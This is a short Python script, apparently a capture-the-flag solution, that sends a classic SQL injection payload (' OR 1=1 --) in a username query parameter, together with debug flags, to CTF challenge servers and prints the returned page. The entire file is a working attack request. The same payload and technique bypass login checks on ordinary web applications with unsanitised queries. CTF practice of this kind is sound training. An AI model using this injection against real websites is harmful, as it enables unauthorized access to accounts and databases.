import requests
import html
import urllib.parse

# put this into your browser first
# page1 = urllib.request.urlopen('http://challenges.ctfd.io:30107/calc/calc.php')

# add this to the end of the URL:
# ?username=' OR 1=1 -- &iamahacker=1&debug=1

# or run the code below using: python websiteattack.py

REQUEST_URL = 'http://ctf.hackucf.org:4001/index.php?username=%27%20OR%201=1%20--%20&iamahacker=1&debug=1'
#Actual URL: http://ctf.hackucf.org:4001/index.php?username=' OR 1=1 -- &iamahacker=1&debug=1

page1 = requests.get(REQUEST_URL)
print(page1.text)

